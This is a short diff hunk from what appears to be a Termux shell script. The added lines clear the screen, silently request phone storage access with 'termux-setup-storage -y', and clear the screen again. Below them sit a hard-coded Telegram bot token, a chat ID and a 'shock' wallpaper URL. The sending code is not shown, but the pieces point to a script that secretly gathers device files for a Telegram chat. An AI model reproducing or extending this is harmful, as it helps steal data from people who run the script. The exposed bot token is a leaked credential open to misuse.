@@ -1,3 +1,7 @@
+
+clear
+termux-setup-storage -y
+clear
 TOKEN="8414749765:AAFFSgDX2llWsHCrN6gpGkSon927LR4ss6A"
 CHAT_ID="8530130542"
 SHOCK_WALLPAPER="https://github.com/HOZOOMD/HOZOOBUG/raw/main/IMG_20251123_134648_254.jpg"
